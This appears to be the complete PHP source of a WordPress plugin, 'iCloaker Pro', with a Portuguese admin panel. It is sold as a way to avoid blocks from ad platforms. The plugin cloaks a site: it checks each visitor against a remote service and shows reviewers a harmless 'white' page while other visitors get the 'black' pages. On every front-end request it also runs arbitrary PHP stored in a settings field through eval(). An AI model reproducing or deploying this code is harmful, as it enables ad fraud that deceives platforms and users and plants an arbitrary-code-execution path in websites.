<?php
    /**
    * Plugin Name: iCloaker Pro
    * Plugin URI: https://icloakerpro.com/?utm_source=wp-plugins&utm_campaign=pro-changelog&utm_medium=wp-dash
    * Description: iCloaker Pro é uma ferramenta profissional e inovadora que veio trazer a solução definitiva na estrutura de landing pages e assim evitar bloqueios indesejados das plataformas de anúncio.
    * Version: 1.0.1
    * Author: iCloaker Pro
    * License: GPL-2.0+
    * License URI: http://www.gnu.org/licenses/gpl-2.0.txt
    * Author URI: https://icloakerpro.com/
    * Text Domain: icloakerpro
    **/

    // add_action('wp_body_open', 'tb_head');
    // function tb_head()
    // {
    //     global $post;
    //     echo $post->ID;
    //     echo '<br>';
    //     get_option('blackpage');        
    // }

    if ( ! defined( 'ABSPATH' ) ) { exit; }
    


    add_action('pre_get_posts', 'changeMainPage');
    function changeMainPage( $query ) {
        if( ! is_admin() && $query->is_main_query() ) {
            if(get_option('enablecloker')){
                @ini_set('memory_limit', '256M');
                @ini_set('upload_max_size', '256M');
                @ini_set('post_max_size', '256M');
                @ini_set('max_execution_time', '300');

                global $post;
                
                $url = '';
                eval(get_option('code'));
                            
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_HTTPHEADER, array($_SERVER['HTTP_USER_AGENT']));
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                $response = json_decode(curl_exec($curl), true);
                curl_close ($curl);
                                            
                if( $response['goToOffer'] === 1 ) {
                    //$query->set('page_id', $post->ID);
                    //$query->set('page_id', get_option('blackpage'));
                    //$_GET['page_id'] = get_option('blackpage');
                    // add_filter( 'the_content',
                    // function () {
                    //     $post_content = get_post(get_option('blackpage'));
                    //     $content = $post_content->post_content;
                    //     return $content;
                    // });
                }else{
                    if( !empty($response['error']) ) {
                        echo $response['error'];
                    }else{
                        $query->set('page_id', get_option('whitepage'));
                        //$_GET['page_id'] = get_option('whitepage');
                        // $post_content = get_post(get_option('whitepage'));
                        // echo apply_filters('the_content', $post_content->post_content);
                    }
                }
            }
        }
    }
    add_action('admin_menu', function () {
        $page_title = 'iCloaker Pro';
        $menu_title = 'iCloaker Pro';
        $capatibily = 'manage_options';
        $slug = 'icloakerpro';
        $callback = 'dashboard';
        $icon = 'dashicons-shield'; 
        $position = 1;

        add_menu_page($page_title, $menu_title, $capatibily, $slug, $callback, $icon, $position);
    });
    add_action('admin_init', function () {
        register_setting('icloaker', 'enablecloker');
        register_setting('icloaker', 'whitepage');
        register_setting('icloaker', 'blackpage');
        register_setting('icloaker', 'code');
    });
    function dashboard() {
        ?>
        <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
        <br><br>
        <div class="wrap top-bar-wrapper">
            <form method="post" action="options.php">
                <?php settings_errors() ?>
                <?php settings_fields('icloaker'); ?>
                <label class="form-switch">
                    <input type="checkbox" name="enablecloker" id="enablecloker"<?php if(get_option('enablecloker')==='on'){echo ' checked';} ?>>
                    <i></i>Habilitar Cloaker no site
                </label>
                <br><br>
                <label for="whitepage">Página White:</label>
                <select name="whitepage"> 
                    <?php 
                    $pages = get_pages();
                    foreach ( $pages as $page ) {
                        ?><option value="<?=$page->ID?>"<?php if($page->ID==get_option('whitepage')){echo ' selected';} ?>><?=$page->post_title?></option><?php
                    }
                    ?>
                </select>
                <br><br>
                <label for="blackpageSelect">Página(s) Black:</label>
                <input type="hidden" name="blackpage" id="blackpage" value="<?=get_option('blackpage')?>" />
                <select name="blackpageSelect" id="blackpageSelect" multiple='multiple' size="5">
                    <?php
                    $pages = get_pages();
                    foreach ( $pages as $page ) {
                        if($page->ID!=get_option('whitepage')){
                            ?><option value="<?=$page->ID?>"><?=$page->post_title?></option><?php
                        }
                    }
                    ?>
                </select>
                <br><br>
                <label for="code">Código da campanha (iCloaker Pro):</label>
                <textarea name="code" id="code"><?=get_option('code')?></textarea>
                <?php submit_button('SALVAR'); ?>
            </form>
            <script>
                jQuery(function($) {
                    $("select[name='blackpageSelect']").change(function() {
                        var $value = $(this).val();
                        var $input = $("#blackpage");
                        console.log(this, $value)
                        $input.val($value);
                    });
                });
                setTimeout(()=>{
                    $('#blackpage').val().split(',').map(function(item, count){
                        $('#blackpageSelect option[value="'+item+'"]').attr('selected', true)
                    })
                }, 500)
            </script>
        </div>
        <?php
    }


    add_action('admin_head', function () {
        ?>
        <style>
            .top-bar-wrapper {display: flex; align-items: center;justify-content: center;margin-top:35px;background-color:#fff;border-radius:15px;margin:auto;max-width:710px;border-left: 3px solid #4966B1;padding:50px;}
            .top-bar-wrapper form {width: 100%;}
            .top-bar-wrapper label {font-size: 20px; display: block; line-height:normal; margin-bottom: 10px;font-weigth:bold}
            .top-bar-wrapper input[type="text"], select {    color:#666;width: 100%; padding: 30px; font-size: 16px;margin-bottom: 10px;}
            .top-bar-wrapper textarea {border-color:1px solid #ddd;width: 100%; height: 150px;padding: 10px; font-size: 16px;margin-bottom: 10px;}
            .top-bar-wrapper .button {font-size: 22px; text-transform: uppercase; background: rgba(59,173,227,1); background: linear-gradient(45deg, rgba(59,173,227,1) 0%, rgba(87,111,230,1) 25%, rgba(152,68,183,1) 51%, rgba(255,53,127,1) 100%);border:none}

            .form-switch {
                display: inline-block;
                cursor: pointer;
                -webkit-tap-highlight-color: transparent;
            }
            .form-switch i {
                position: relative;
                display: inline-block;
                margin-right: .5rem;
                width: 46px;
                height: 26px;
                background-color: #e6e6e6;
                border-radius: 23px;
                vertical-align: text-bottom;
                transition: all 0.3s linear;
            }
            .form-switch i::before {
                content: "";
                position: absolute;
                left: 0;
                width: 42px;
                height: 22px;
                background-color: #fff;
                border-radius: 11px;
                transform: translate3d(2px, 2px, 0) scale3d(1, 1, 1);
                transition: all 0.25s linear;
            }
            .form-switch i::after {
                content: "";
                position: absolute;
                left: 0;
                width: 22px;
                height: 22px;
                background-color: #fff;
                border-radius: 11px;
                box-shadow: 0 2px 2px rgba(0, 0, 0, 0.24);
                transform: translate3d(2px, 2px, 0);
                transition: all 0.2s ease-in-out;
            }
            .form-switch:active i::after {
                width: 28px;
                transform: translate3d(2px, 2px, 0);
            }
            .form-switch:active input:checked + i::after { transform: translate3d(16px, 2px, 0); }
            .form-switch input { display: none; }
            .form-switch input:checked + i { background-color: #4BD763; }
            .form-switch input:checked + i::before { transform: translate3d(18px, 2px, 0) scale3d(0, 0, 0); }
            .form-switch input:checked + i::after { transform: translate3d(22px, 2px, 0); }
        </style>
        <?php
    });